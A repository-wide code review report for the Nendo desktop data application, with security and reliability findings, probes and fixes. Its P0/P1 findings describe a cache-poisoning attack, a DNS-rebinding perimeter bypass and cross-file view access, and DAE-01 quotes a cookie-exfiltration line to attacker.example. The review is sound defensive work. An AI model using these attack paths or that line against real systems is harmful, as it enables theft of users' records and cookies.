# Broad review: code, UI and UX

Review started 2026-10-10 at HEAD `205be7a` (0.19.0). Scope: the whole repository —
Engine, Local MCP, Desktop, Workbench (code, CSS, live UI in both themes), the
extension packages, tools and gates, tests, site and documentation. Review only: no
product source is changed by this task. This tally is written incrementally as
findings are verified.

## Status

- Complete (2026-10-11). Round 1: 35 areas. Round 2: 6 areas the completeness critic opened on its gaps (adapter parity, ADR and vision conformance, locale and time, reversibility matrix, safe mode and file versions, several processes). Every finding had a skeptic vote; duplicates were folded.
- Areas reported: 41. Raw findings: 708; kept after verification: 644 (595 after folding 49 duplicates); refuted: 64; awaiting verification: 0.
- Kept by priority: P0 2, P1 4, P2 95, P3 494.
- Fix pass 2026-10-11: both P0 and all four P1 findings are fixed, and so are the five P2 findings in the security category (MHS-02, ESM-02, WMX-01, TGA-01, DAE-02), each with a guard seen to fail with the defect put back. See [Fix pass](#fix-pass). Fix pass 2026-10-12 (W-204): the nine P3 security findings are closed, eight with a falsified guard and BL-09 by a lock refresh, and DAE-08 with them. TST-02 is fixed too (gate harness). Fix pass 2026-10-12 (W-206): the 30 shell, focus and keyboard findings are fixed, two in part. Fix pass 2026-10-12 (W-207): the 30 data view, form and markup findings are fixed, four in part. Fix pass 2026-10-12 (W-208): the 21 semantic compiler, review-line and History findings are fixed, one in part. Fix pass 2026-10-12 (W-210): the 21 UX copy, status and recovery findings are fixed, two in part. The other findings are open, planned as W-205, W-209 and W-211 to W-231 under I-009 in the Nendo Development planner; W-205's five decisions are accepted (D-005 to D-009).

## Method

- One reviewer per area reads its code in full and reports concrete defects with a
  failure scenario. A separate skeptic then tries to refute each one against the code,
  the accepted ADRs and the contracts; P0/P1 survivors are then re-read by the coordinator.
  Refuted findings are dropped; a finding that survives but whose reachability was not
  established end to end is marked *Plausible*. Priority is the skeptics' re-assessment.
- A completeness critic reads every reviewer's coverage statement and opens a second
  round on the gaps (IDs starting `R2`).
- Live UI/UX: headless Edge over CDP against the Workbench preview server
  (`?preview=1`, a fixture host), measured at 1440×900, 1024×768 and 800×700 in Light
  and Dark. The native WinUI shell was reviewed from source only.
- Evidence column: *Executed* means a probe, test or browser measurement was run and its
  literal result is quoted in the detail; *Source* means a code trace only.

## Limitations

- The native WinUI shell was reviewed from source only; live UI tours used the Workbench preview fixture host, and preview-only defects are labelled as such.
- Skeptics vote once per finding in batches (Sonnet for P2/P3), after a three-vote design ran out of usage; every P0 and P1 survivor was then re-read against the code by the coordinator.
- Duplicates were folded within three groups of related areas (engine and MCP; desktop, Workbench and UI; tools, tests, site and extensions); a duplicate that spans two groups may still appear twice.

## Priority

| Priority | Meaning |
| --- | --- |
| P0 | Data loss or corruption, a security boundary breach, or a crash on a common path |
| P1 | High-impact defect in a common workflow, or a broken invariant from `AGENTS.md` |
| P2 | Material defect or friction with a workaround |
| P3 | Minor defect, polish, maintainability or documentation drift |

## Summary

Seven themes cover most of what matters. Fix in this order:

1. **Isolation between files and origins is the weakest point.** Both P0s and one P1 are boundary failures: the view content cache lets a crafted file plant code that a later file's view runs ([DAE-01](#dae-01)); a case variant of `/mcp` skips the whole MCP perimeter, DNS-rebinding defence included ([MHS-01](#mhs-01)); and a view's broker keeps answering after the file changes, so it reads, and can write, the next file ([WXS-01](#wxs-01)). Related: [MHS-02](#mhs-02), [ESM-02](#esm-02), [WMX-01](#wmx-01), [DAE-02](#dae-02).
2. **Refused saves and unsaved typing are handled inconsistently.** The Workbench classifies Engine refusals from a hand-copied list, so a definitive refusal it does not know (`value-not-unique`) wedges the save journal for the whole file ([WCS-01](#wcs-01), [WST-03](#wst-03)). Elsewhere a refused grid edit stays drawn as saved ([UX-02](#ux-02)), and several routes and keys discard a record form's typing without asking ([UX-01](#ux-01), [UX-12](#ux-12), [UIS-04](#uis-04), [WDV-08](#wdv-08)).
3. **Automatic actions are checked once, at install, and then fail late or silently.** Bindings, result types, required fields, trigger fields and later schema edits are not validated, so a definition installs and then fails every save, or a condition that cannot be evaluated silently skips its action ([EBH-01](#ebh-01)–[EBH-09](#ebh-09), [ESM-03](#esm-03), [ESM-05](#esm-05)). The same unchecked conversion lets one outside-edited cell make a whole file unopenable once a calculation reads it ([R2SMA-01](#r2sma-01)), against the rule that Nendo must not produce a file it will not open.
4. **Some reversibility claims are stronger than the implementation.** Operations declared reversible have no compensation, and several undo paths are refused or throw after committing ([ESM-12](#esm-12), [ESM-04](#esm-04), [ESS-02](#ess-02), [ESQ-03](#esq-03)). This touches the invariant that every operation declares its reversibility honestly.
5. **Redraw-by-innerHTML costs keyboard and screen-reader users.** Many updates rebuild whole regions, so focus drops to `<body>`, live regions re-announce, and an endless redraw loop is possible ([WDV-01](#wdv-01), [UIK-01](#uik-01), [UIK-03](#uik-03), [UIK-04](#uik-04), [UIK-05](#uik-05), [UX-03](#ux-03), [GGV-03](#ggv-03)). Contrast themes and narrow windows break the shell ([CSS-04](#css-04), [CSS-01](#css-01), [UIS-01](#uis-01), [UIS-02](#uis-02)).
6. **Review screens don't always say what will change.** Proposal lines omit the field or type they act on, History shows raw operation identifiers, and package code review shows bidirectional control characters as-is ([ESM-14](#esm-14), [UIT-05](#uit-05), [UX-07](#ux-07), [WMX-01](#wmx-01)).
7. **A few gates can pass wrongly or touch the owner's machine.** Five custom-view lanes fail open at a modal ([TGA-01](#tga-01)); journey tests rewrite the owner's Jump List and theme ([BL-01](#bl-01), [TGA-04](#tga-04)); two lanes still flake ([TST-01](#tst-01), [TST-02](#tst-02)).

<a id="dae-01"></a>

### DAE-01 — The view content cache trusts the hash a file states and outlives the file, so a crafted file plants code that another file's view then runs

**P0** · security · Confirmed · area `desktop-agents-extensions`

- **Where:** `src/Nendo.Desktop/Extensions/DesktopSessionController.Extensions.cs:335`, `src/Nendo.Desktop/Extensions/DesktopSessionController.Extensions.cs:342`, `src/Nendo.Desktop/Extensions/DesktopSessionController.Extensions.cs:62`, `src/Nendo.Desktop/Extensions/DesktopSessionController.Extensions.cs:115`, `src/Nendo.Engine/Storage/SqliteNendoStore.ExtensionPackages.cs:126`, `src/Nendo.Engine/Storage/SqliteNendoStore.ExtensionPackages.cs:417`
- **What:** ReadExtensionAssetAsync answers a view request from _extensionContent.TryGet(file.Sha256) before it reads the open file (line 335), and after a read it caches the bytes with _extensionContent.Add(content.Sha256, content.Content) (line 342). content.Sha256 is the sha256 column of __nendo_extension_file as stored: SqliteNendoStore.ReadExtensionFileAsync returns f.sha256 and b.content without hashing, and the open-time check ExtensionPackagesAreValidAsync only tests that each sha256 is 64 hex characters (its own comment says content hashes are checked only by a full integrity verification, never on an ordinary open). The cache is one field per DesktopSessionController (line 62), i.e. per window, and StopExtensionsForFile (line 115), which runs on every file-session rotation, clears _viewProposals, _extensionServing and development links but not _extensionContent. Probe through the shipped 0.19.0 Desktop assembly: bytes added under the SHA-256 of other content survive StopExtensionsForFile and are served back under that hash.
- **Failure:** An attacker sends a .nendo file whose package row names a.js with sha256 = SHA-256 of a well-known view file (for example a file of the Garden, Lens or work-dependencies package published in this repository) and whose blob under that key holds attacker JavaScript. The person opens it (views run by default), its view loads a.js, and the cache now maps that hash to the attacker's bytes. The person then opens their own file carrying that package in the same window (Open, Recent or drop). Its view requests the real file, gets a cache hit on the hash, and runs the attacker's code at the person's own package origin, with that package's broker access to every record of the person's file and the open network to send them away.
- **Reproduction:** Executed: pwsh -File scratchpad/review/desktop-agents-extensions/cache-probe.ps1 (0.19.0 payload, no .nendo opened) -> "after the file session ended, the cache answers hash 8ddd56a44780... with: fetch(\"https://attacker.example/?d=\" + document.cookie)" and "bytes served match the hash they are served under: False". The Engine half (stored hash returned unverified, open check does not hash content) is from source.
- **Fix and guard:** Verify before caching: compute NendoExtensionContent.Sha256(content.Content) and cache (and serve) only when it equals file.Sha256, answering 500 or 503 otherwise; and clear _extensionContent in StopExtensionsForFile (or key entries by file session) so nothing crosses files. Guard in Nendo.Desktop.Tests: a fixture whose ReadExtensionFileAsync returns content that does not match its stated sha256 must not be cached, and an entry cached in one file session must not be served after RotateFileSession; falsify by removing the hash check and watch the second file receive the planted bytes.
- **Verifier:** Traced end to end in source. Opening a file only shape-checks package hashes: SqliteNendoStore.Inspection.cs:400 calls ExtensionPackagesAreValidAsync (SqliteNendoStore.ExtensionPackages.cs:417-446), which tests 64 hex characters only. Content is hashed only by the explicit VerifyIntegrityAsync (SqliteNendoStore.Read.cs:77), and the blob table has no hash constraint (ExtensionPackages.cs:38-44). ReadExtensionFileAsync (ExtensionPackages.cs:126-140) returns the stored f.sha256 and the blob joined on that key without hashing, and DesktopSessionController.Extensions.cs:342 caches the bytes under that stated hash. ExtensionContentCache (lines 455-489) is keyed by hash alone, with no package, origin or file session in the key. StopExtensionsForFile (line 115), called by RotateFileSession (DesktopRequestBinding.cs:49-51) on every close, never clears it. The controller survives a file switch in the same window: MainPage.FileActions.cs:158-168 and 178-185 call _session.CloseAsync and then open the next file on the same _session. The new file's view asks for its genuine hash and gets a hit at line 335, so the planted bytes run at that file's own package origin. ADR-0013 lines 625-628 say view code cannot reach other files, and the ADR's 'cached by its SHA-256 ... can never be stale' (line 156) assumes the hash matches the content. Neither is a deliberate trade-off that covers this. No test in tests/Nendo.Desktop.Tests/DesktopExtensionServingTests.cs covers the cache.
- **Correction:** Additional locations: SqliteNendoStore.Inspection.cs:400 (the only open-time check), SqliteNendoStore.Read.cs:77 (the only hash comparison, explicit verify only), MainPage.FileActions.cs:158-168 (same-window close and open reuses the controller). Scope: each window is its own process (DesktopWindowHandoff.cs:11), so the victim file must be opened in the same window after the crafted one, through Open, Recent or a drop after 'Open another file?'. A file already open in another window is not reached. The reviewer's probe calls ExtensionContentCache.Add by reflection rather than serving a crafted .nendo, so it shows only that an entry survives StopExtensionsForFile; the Engine and serving halves are from source, and I confirmed them. Fix: verifying NendoExtensionContent.Sha256(content.Content) == file.Sha256 before caching and serving is enough by itself, and it keeps the intended content-addressed cross-file reuse safe. Clearing the cache in StopExtensionsForFile is defence in depth. A corrupted (not malicious) blob in one file poisons later files in that window the same way.

<a id="mhs-01"></a>

### MHS-01 — A case variant of the path (/MCP, /Mcp) skips the whole MCP perimeter: Host, Origin, loopback, body cap, depth cap, request gate, timeout and closed admission

**P0** · security · Confirmed · area `mcp-host-security`

- **Where:** `src/Nendo.LocalMcp/NendoMcpSecurityMiddleware.cs:26`, `src/Nendo.LocalMcp/NendoLocalMcpHost.cs:565`, `src/Nendo.LocalMcp/NendoLocalMcpHost.cs:566`, `docs/contracts/mcp-interface.md:207`, `docs/decisions/0009-local-mcp-transport-authority-and-change-sets.md:281`
- **What:** NendoMcpSecurityMiddleware.InvokeAsync applies every check only when context.Request.Path.StartsWithSegments("/mcp", StringComparison.Ordinal). Any other path goes straight to next(context). ASP.NET Core endpoint routing matches literal segments case-insensitively, so MapMcp("/mcp") (NendoLocalMcpHost.cs:566) also serves /MCP and /Mcp, which the ordinal comparison does not recognise. On those paths none of the following runs: the loopback check, IsExactHost (the DNS-rebinding defence), IsExactOrigin, the 256 KiB body cap, the 32-level depth cap, NendoRequestGate, the five-minute timeout, and the post-body authority.IsActive check. No test sends a case variant: McpSecurityTests always sets Path = "/mcp" and calls the middleware directly, never through routing. One limit: the SDK itself refuses a text/plain body with 415, so a plain cross-site form-style request does not get through. The exposure is DNS rebinding, where the request is same-origin to the browser and may send application/json.
- **Failure:** A web page at http://rebind.attacker.example:41763/ (the fixed, documented port) uses a TTL-0 DNS answer that flips to 127.0.0.1 and then POSTs application/json to /MCP. The Host header is rebind.attacker.example:41763 and the request is same-origin to the browser, so the page reads every response. That gives it initialize and tools/list, nendo.read.resource over every record of the open file at Inspect and above, nendo.lease.acquire plus data writes at Edit data, change sets at Shape app, and self-acceptance at Unattended. A browser without local-network-access prompting (Firefox, for example) does not stop it. The same path also accepts a 300 KB or 40-level-deep body that /mcp refuses.
- **Reproduction:** Executed: probe-path-case.ps1 in the scratch folder. It loads the HEAD payload's Nendo.LocalMcp.dll and the SDK and composes UseMiddleware<NendoMcpSecurityMiddleware> then MapMcp("/mcp") on 127.0.0.1, as the host does. Output: `POST /mcp Host=rebound.example:58417 -> 400 {"error":"NENDO_INVALID_HOST",...}`; `POST /mcp Origin=https://evil.example -> 403 NENDO_INVALID_ORIGIN`; `POST /MCP Host=rebound.example:58417 -> 200 event: message \| data: {"result":{"protocolVersion":"2025-06-18",...},"id":1}`; `POST /Mcp Host=rebound.example:58417 Origin=http://rebound.example -> 200 ... result`; `POST /mcp bytes=300149 -> NENDO_REQUEST_TOO_LARGE`; `POST /MCP bytes=300149 (40-deep) -> 200 {"result":{},"id":2}`. A second run, probe-path-case-simple.ps1, sent a text/plain body with Origin https://evil.example: `/mcp -> 403 NENDO_INVALID_ORIGIN`, `/MCP -> 415`.
- **Fix and guard:** Apply the perimeter to every request, whatever its path: run the loopback, Host and Origin checks before the path test, and answer 404 for anything else. Alternatively, compare with StringComparison.OrdinalIgnoreCase, or attach the checks to the MapMcp endpoint group so routing and the perimeter cannot disagree. Guard: in McpSecurityTests, run every perimeter case (mismatched Host, mismatched Origin, oversize, over-deep, closed host) through a real host over /mcp, /MCP, /Mcp and /mcp/, and assert the NENDO_ refusal. Falsify by restoring the ordinal comparison and quote the failure: an MCP result where NENDO_INVALID_HOST was expected.
- **Verifier:** src/Nendo.LocalMcp/NendoMcpSecurityMiddleware.cs:26 gates every perimeter check on Path.StartsWithSegments("/mcp", StringComparison.Ordinal) and otherwise calls next(); NendoLocalMcpHost.cs:565-566 composes UseMiddleware then MapMcp("/mcp"), whose route literal matches case-insensitively. No other Host/Origin/loopback check exists in src/Nendo.LocalMcp (grep), tools do not depend on middleware state (NendoTransportIdentity falls back to the clientInfo name), and tests only send "/mcp" (McpSecurityTests.cs:190, HostHardeningTests.cs:307). I re-ran the probe in verify/mcp-host-security-1 with the real middleware DLL and SDK in Stateless mode as the host uses: /mcp with Host rebound.example -> 400 NENDO_INVALID_HOST, /MCP and /Mcp with the same Host and a foreign Origin -> 200 initialize result, a 300 KB 40-deep body -> NENDO_REQUEST_TOO_LARGE on /mcp but 200 on /MCP. ADR-0009:281 names Host/Origin matching as the only defence against DNS rebinding because the endpoint has no credential, so the bypass breaks the stated security boundary for any file with access above Off.
- **Correction:** Closed admission is only partly skipped: the host's list, call and read filters (NendoLocalMcpHost.cs:412-519) still call authority.RequireActive(), so after closing only initialize/ping get through on /MCP (my probe: /mcp -> 401 NENDO_HOST_CLOSED, /MCP -> 200 initialize). How reachable the rebinding scenario is depends on the browser: Chromium's Local Network Access prompt for public-to-loopback requests and resolver-side rebinding filters stop it, while browsers without that protection do not. That narrows it but does not refute it. Fix as proposed. Put the perimeter on the MapMcp endpoint group, or run Host/Origin/loopback for every path, so routing and the perimeter cannot disagree.

<a id="wxs-01"></a>

### WXS-01 — A view keeps its broker connection after the file changes, so it reads the next file, and writes to it when that file carries the same package ID

**P1** · security · Confirmed · area `workbench-extension-sandbox` (reported P0)

- **Where:** `src/Nendo.Workbench/src/view-frames.ts:101`, `src/Nendo.Workbench/src/view-frames.ts:106`, `src/Nendo.Workbench/src/extension-broker.ts:808`, `src/Nendo.Workbench/src/file-actions.ts:324`, `src/Nendo.Workbench/src/host-desktop.ts:205`, `src/Nendo.Workbench/src/actions.ts:336`, `docs/contracts/custom-views.md:364`
- **What:** The broker's deps in installViewFrames read the live `state.session`: `running: () => state.session.extensions?.run === true`, `context: ... viewContext(spec, state.session, ...)` and `describe: () => describeSchema(state.session)`. `run()` checks only `deps.running()`. Neither BrokerMount nor the broker carries the file session the frame was mounted under; that exists only inside mountKey. Host requests go out with the client's current `fileSessionId` (host-desktop.ts:200,205), not the mount's, so the host's stale-file-session fence (DesktopRequestBinding.cs:41) passes. `showFileActionOutcome` sets `state.session = refreshed` (the new file), then awaits `refreshDerived()` (semantic.compile, data.queryRecords and more) and `refreshRecentFiles()` before `rerender()`. Only that render's `releaseViewFrames()` disconnects the old file's frames. openWorkspaceView (actions.ts:334-341) follows the same order when the session changed. Throughout that window the old file's views stay connected, and every request they make is answered from the new file. Reads carry no actor, so the host cannot tell them apart. Writes carry `extension:<package>` and are admitted when the new file carries that package (RequireExtensionWriter).
- **Failure:** File A, received from someone else, carries a view that polls `nendo.schema.describe()` every few milliseconds. The broker answers that locally, without a host round trip. The person opens file B with File > Open, Recent or a drop, and B's views are allowed to run. During B's refreshDerived the view receives B's purpose, record types and fields. Its `records.query` and `records.search` calls then return B's records, which it can send over the network. If B carries a package with the same ID as A's view (a copy of A, or a package shared between files), `records.create`, `records.update` and `records.delete` are admitted against B too. The contract says 'A frame left over from a closed file reaches nothing', and ADR-0013 lists 'other files' among what view code cannot reach.
- **Reproduction:** Executed: node probe.mjs crossfile (the real extension-broker.ts and extension-model.ts bundled with vite; describe reads a mutable session the way view-frames.ts does; session switched from A to B after connect) -> A.before {"purpose":"File A","entities":["a.task"]} / A.after {"purpose":"File B: private ledger","entities":["b.salary"]} / A.read {"ok":true,"sentToHost":{"method":"data.queryRecords","payload":{"entityId":"b.salary","limit":100,"cursor":null,"filters":[]}}}. Also: node probe-broker-misc.mjs (3) -> forwarded after the session moved: [{"method":"data.queryRecords","session":"file-session-B","actor":"(none)"}]
- **Fix and guard:** Bind each mount to its file session. Add `fileSessionId` to BrokerMount (view-frames already puts it in mountKey) and give the broker a `deps.fileSessionId()`. In `receive` and `run`, refuse with `stale-file-session` and close the connection when the two differ. Send view requests with the mount's session, so the host's fence refuses a stale one. Also disconnect every connection synchronously wherever `state.session.fileSessionId` changes, before the first await in showFileActionOutcome, openWorkspaceView and the other paths that replace the session, so no frame of the old file is connected while the new one loads. Guard: an extension-broker.test.mjs case that connects, changes the session, and asserts that schema.describe and records.query are refused without deps.request being called and that the port is closed. Falsify it by removing the check.
- **Verifier:** Traced end to end. The broker's deps read the live session: view-frames.ts:101 running(), :102-106 context and describe. run() checks only deps.running() (extension-broker.ts:808). The port's onmessage (extension-broker.ts:918, heard/request) never re-checks the mount or the file session. File > Open, Recent and a drop close A and open B in the same window (MainPage.FileActions.cs:160-170). The host rebuilds _extensionServing for B when it builds B's snapshot (DesktopSessionController.Extensions.cs:277). host-desktop.ts:256-257 switches the client's fileSessionId to B before resolving, and every later envelope carries it (host-desktop.ts:205), so the stale-file-session fence (DesktopRequestBinding.cs:41) passes. showFileActionOutcome sets state.session = B (file-actions.ts:324), then awaits refreshDerived. That is at least two serial host round trips: semantic.compile, then data.queryRecords (actions.ts:227-256). Only after that does rerender reach releaseViewFrames (main.ts:174) and dispose the old mounts. resetFileView (actions.ts:125-153) and clearFileScoped touch no frames, and no host event disposes them. During that window schema.describe answers B's schema locally, and reads pass straight to the host (extension-broker.ts:188-189, 528-532). Writes carry extension:<A's packageId> from the mount spec (extension-broker.ts:288-291). RequireExtensionWriter and AdmitExtensionWriterAsync (DesktopSessionController.Extensions.cs:128-158) admit that actor when B carries the same package ID. FileEnabled defaults to true (DesktopExtensionSettingsStore.cs:171-174), so B's run flag is normally true. This breaks ADR-0013:628 ('other files') and the AGENTS.md invariant that file JS reaches only that file's data. I rate it P1 rather than P0: exploiting it needs a hostile view on screen when the person switches files, the window lasts only as long as the refresh, and writes also need a package-ID match.
- **Correction:** The contract sentence at custom-views.md:364-365 belongs to the origin and storage section, so it is weak support; the governing authority is ADR-0013:628 ('View code cannot reach ... other files'), plus the AGENTS.md invariant. The window is the refresh after the client takes B's fileSessionId (host-desktop.ts:256-257) until rerender, which is mainly refreshDerived's serial host round trips (actions.ts:227-256); refreshRecentFiles returns at once when B has a file. A request sent in that window but answered after dispose is not delivered (post drops on a closed connection). So exfiltration needs an answer before the rerender, which the request gate's ordering makes likely for a read queued ahead of refreshDerived's second stage. A write commits whether or not its answer is delivered.

<a id="r2sma-01"></a>

### R2SMA-01 — A cell whose stored type does not match its field passes inspection as a normal writable file, and the first calculation that reads it makes the whole file unopenable

**P1** · data-integrity · Confirmed · area `r2-safe-mode-and-file-versions`

- **Where:** `src/Nendo.Engine/Storage/SqliteNendoStore.Inspection.cs:642`, `src/Nendo.Engine/Storage/SqliteNendoStore.BehaviourSource.cs:569`, `src/Nendo.Engine/Behaviour/CalculationService.cs:132`, `src/Nendo.Engine/Storage/SqliteNendoStore.Read.cs:300`, `src/Nendo.Engine/Storage/SqliteNendoStore.Inspection.cs:585`
- **What:** ValidateReadableMappingsAsync checks each user column only for typeof() = 'blob' (Inspection.cs:642-648); a TEXT value in an INTEGER column, a non-date string in a Date column or a number in a Text column raises no finding, so the file classifies NormalReadOnly with CanAcquireWriteAuthority and opens writable. ReadRecordsAsync projects the raw value (an Integer field reads back as the JSON string "abc"). Calculations convert stored values with System.Convert.ToInt64 / DateOnly.ParseExact / (string) casts (BehaviourSource.cs:579-583), which throw FormatException or InvalidCastException; EvaluateRecordAsync catches only NendoCalculationException (CalculationService.cs:132) and EvaluateCalculationsAsync only NendoException/JsonException. Installing a calculation is not checked against existing values, so it commits. From then on every snapshot and query throws a raw FormatException, and on the next open InspectAsync runs the same calculations inside ReadRecordsAsync (Read.cs:300); the exception reaches the outer IsProjectionFailure catch and the file becomes Rejected 'unreadable-data' with NendoFileCapabilities.None: no data, no export, no backup. ADR-0003 says external changes are drift that 'produces a normal, read-only or recovery-required open classification', and the ADR index records the owner's rule that the product must not produce a file it will not open.
- **Failure:** A person bulk-loads or fixes a few rows with a SQLite tool or script (the outside-edit case FileInspectionTests and DesktopRecoveryTests already model) and one Integer cell ends up holding 'abc'. Nendo opens the file writable with no warning and shows 'abc' in a number column. Later they (or an agent at Shape app) add a calculated field over that column. The change is accepted, every screen then fails with an internal error, and after closing, the file cannot be opened at all: the native panel has Backup, Export and Restore disabled and nothing in Nendo can show the other records.
- **Reproduction:** Executed: scratch probe1.ps1/probe2.ps1 on a file whose projects.total (Integer) holds 'abc' -> 'plain-after: classification=NormalReadOnly readData=True findings=[] canWrite=True', 'plain-after writable open: health=Normal mutate=True', 'record p2 total="abc"'; in that writable session 'sum(total) in the writable session failed: System.FormatException: The input string 'abc' was not in a correct format.'; installing calculation 'total * 2' -> 'calculation installed: revision=revision-6d4f... changeSequence=4', then 'snapshot after install failed: System.FormatException: ...', 'query after install failed: System.FormatException: ...', and 'reinspect: classification=Rejected readData=False backup=False export=False findings=[unreadable-data: The file could not be safely interpreted. No change or guessed repair was made.]', 'read-only open failed: Nendo.Engine.NendoFileOpenException'.
- **Fix and guard:** In ValidateReadableMappingsAsync, check each mapped column with one bounded query per column (SELECT EXISTS(... WHERE typeof(col) NOT IN (<storage classes the kind allows>, 'null'))) and report a mismatch as mapping-drift (RecoveryRequired, data readable, editing off) instead of letting it through. In BehaviourRecordSource.Convert, turn conversion failures into NendoCalculationException(InputInvalid) so one bad cell fails that field's value, not the file. Guard: an Engine test that writes 'abc' into an Integer column of a fixture and asserts (a) inspection gives mapping-drift with ReadData true, and (b) a file that also carries a calculation over that column still inspects as RecoveryRequired with the other records readable; falsify by reverting the typeof check and watching (a) report NormalReadOnly.
- **Verifier:** I read the code and reproduced the chain myself with the HEAD debug Engine build. That build is artifacts/bin/Nendo.Engine/debug, built 2026-10-10 15:35, after 205be7a, and its md5 matches the reviewer's copy. ValidateReadableMappingsAsync (src/Nendo.Engine/Storage/SqliteNendoStore.Inspection.cs:642-648) checks only typeof='blob', and user columns carry no STRICT or CHECK (Operations.cs:549,561). BehaviourRecordSource.Convert (BehaviourSource.cs:579-583) uses System.Convert.ToInt64, (string) and DateOnly.ParseExact. EvaluateRecordAsync catches only NendoCalculationException (CalculationService.cs:132), and EvaluateCalculationsAsync guards only GetCompiledBehaviourAsync (BehaviourSource.cs:136-147). ReadRecordsAsync runs the calculations (Read.cs:300) inside InspectAsync, so the FormatException reaches the outer IsProjectionFailure catch (Inspection.cs:585, 740-742) and returns Rejected 'unreadable-data'. Probe output: 'A after outside edit: classification=NormalReadOnly ... canWrite=True findings=[]'. Then 'A calc install: revision=revision-1bfe...' and 'A snapshot after install failed: System.FormatException: The input string 'abc' was not in a correct format.' Then 'A reinspect: classification=Rejected readData=False export=False backup=False' and 'A read-only open failed: NendoFileOpenException'. This contradicts ADR-0003:121, where drift gives a normal, read-only or recovery-required classification. It also contradicts the code's own intent at Inspection.cs:437-447, that inspection must still finish. It is not P0: the cell is still intact on disk, and the trigger is an outside SQLite edit, which ADR-0003:154 calls unsupported. The result is still a file Nendo will not open and cannot export.
- **Correction:** The scenario is simpler than reported. A file that already carries a calculation goes straight to Rejected after the outside edit, with no install step. Probe: 'B after outside edit: classification=Rejected readData=False export=False backup=False findings=[unreadable-data]'. Only non-numeric text lands as TEXT. INTEGER affinity turns '7' back into an integer, so case C stayed NormalReadOnly. The fix has to cover more than FormatException. Convert's own designed type-mismatch refusal throws NendoValidationException (BehaviourSource.cs:588), and a number in a Text column throws InvalidCastException at the (string) cast. EvaluateRecordAsync catches neither, so the fix belongs in EvaluateRecordAsync or ReadFieldAsync and must map every conversion failure to a per-field NendoCalculationException. I did not trace the claim that 'every screen fails with an internal error' in the Desktop host; only the Engine-level raw FormatException from GetSnapshotAsync was observed.

<a id="wcs-01"></a>

### WCS-01 — A duplicate refused in a unique field (and other complete refusals) leaves the save journal 'pending' forever, discards the draft and locks editing of the file on this device

**P1** · reliability · Confirmed · area `workbench-core-state`

- **Where:** `src/Nendo.Workbench/src/pending-mutations.ts:19`, `src/Nendo.Workbench/src/pending-mutations.ts:129`, `src/Nendo.Workbench/src/pending-mutations.ts:99`, `src/Nendo.Workbench/src/write-failure.ts:37`, `src/Nendo.Workbench/src/actions.ts:85`, `src/Nendo.Workbench/src/main.ts:161`
- **What:** PendingMutationJournal.sendPending drops the retained entry only when the host code is in the `rejected` set; every other code keeps the entry 'pending' after a receipt lookup finds nothing. The set omits codes the host passes through verbatim from NendoPreconditionException (WorkbenchProtocol.cs:455-457) for the journaled write methods: value-not-unique and field-values-not-unique (ADR-0020), hierarchy-parent-invalid, hierarchy-parent-required, hierarchy-order-invalid, hierarchy-cycle-present, kept-in-new-files-unchanged, write-ceiling-bytes/rows/schema, action-target-mismatch, plus write-owned and cancelled. decideWriteFailure uses the same set, so runMutation classifies the refusal as unsettled and calls recoverAfterWriteFailure, which rebuilds the record form. render() then sees pendingMutation().state === 'pending' and disables every input/select/textarea/[data-action] on every view except Help. 'Check or retry save' (journal.retry) finds no receipt and resends the identical payload, which the host refuses identically; submit() refuses every other save with 'A previous save is still unconfirmed'. The entry lives in localStorage, so a restart does not clear it (initialise uses checkPendingMutation with allowReplay=false). holderNamed() in actions.ts shows that value-not-unique is an expected form refusal (ADR-0020, DesktopUniqueRefusalTests).
- **Failure:** A record type has a unique Code field (ADR-0020). The person types an existing code on a record page and presses Save. The host refuses with value-not-unique and nothing commits. The typed values vanish (form rebuilt), the page says 'A previous save has not been confirmed. Check or retry that saved request', every control in the file is disabled, and each 'Check or retry save' is refused with the same duplicate sentence. The person cannot edit any record in that file on this computer, even after restarting Nendo, unless something outside the Workbench removes the duplicate or the localStorage key.
- **Reproduction:** Executed: node probe-journal-unique.mjs (bundles pending-mutations.ts and write-failure.ts with vite into memory) -> "value-not-unique: confirmed rejection=false decideWriteFailure=refresh-view" ... "save refused with value-not-unique -> journal entry state now pending" / "Check or retry save #1: refused value-not-unique; entry still pending" / "Check or retry save #2: refused value-not-unique; entry still pending" / "next unrelated save: \"A previous save is still unconfirmed. Check or retry that saved request first.\""
- **Fix and guard:** Classify by what the host guarantees rather than by an allow-list that drifts: have the host mark a response as a complete refusal (for example error.settled: true for every NendoPreconditionException/NendoCalculationException/NendoValidationException raised before commit) and have isConfirmedRejection honour it, or at minimum add the missing precondition codes. Guard: a node test that feeds every NendoPreconditionException code the Engine can raise on data.createRecord/setField(s)/deleteRecord/moveRecord/setKeptInNewFiles/executeCommand (generated from the C# source, as precondition-codes.txt here was) through journal.submit and asserts the entry is removed and decideWriteFailure answers retain-draft; plus a Desktop test that a duplicate save through the protocol leaves no pending entry.
- **Verifier:** Traced end to end. The Engine throws NendoPreconditionException("value-not-unique") before commit (SqliteNendoStore.FieldRules.cs:209) and WorkbenchProtocol.cs:455-457 passes the code through verbatim (DesktopUniqueRefusalTests.cs:42 pins it). The rejected set at pending-mutations.ts:19-33 does not include it, so sendPending (:129) falls through to lookup. data.getReceipt returns null for a key that never committed (SqliteNendoStore.Outcomes.cs:12-30), so the localStorage entry, keyed on applicationId/instanceId (host-desktop.ts:258), stays 'pending'. decideWriteFailure (write-failure.ts:37) answers refresh-view, so runMutation (actions.ts:85-86, refreshAfterFailure=true from record-form.ts:117/167) calls recoverAfterWriteFailure. With the same session it answers keep-editable, then refreshDerived() and rerender(); render clears openDraft (main.ts:117) and rebuilds the form, so the typing is lost. renderPendingMutation then returns true and main.ts:161-170 disables every input and [data-action] outside Help. submit() refuses any new save (pending-mutations.ts:86-87). retry() resends the identical payload (:106), which is refused the same way. Startup only checks without replay (main.ts:385). The client has no uniqueness pre-check, and no test feeds value-not-unique through the journal: write-failure.test.mjs:13-19 pins a hand-copied list. Only an outside change to the record (MCP or a custom view, which yields record-version-conflict, a rejected code) clears it.
- **Correction:** Narrow the list of missing codes. 'cancelled' (the host says to refresh status; the outcome can be unknown) and 'write-owned' (it clears once the other writer releases, so a retry can succeed) are reasonably kept pending and should not be in the fix. The definitive pre-commit codes are value-not-unique, field-values-not-unique, the hierarchy-* precondition codes, kept-in-new-files-unchanged, write-ceiling-*, and action-target-mismatch. One escape route is not mentioned: an outside edit to the same record through MCP or a custom view makes the retry fail with record-version-conflict, which does clear the entry. Overlaps FIXES.md WST-03 (the same root cause, filed as a test gap), so the two can be folded together.

### WDV-01 — Opening the Filter menu on a screen with a reference field starts an endless redraw-and-read loop

**P1** · reliability · Confirmed · area `workbench-data-views`

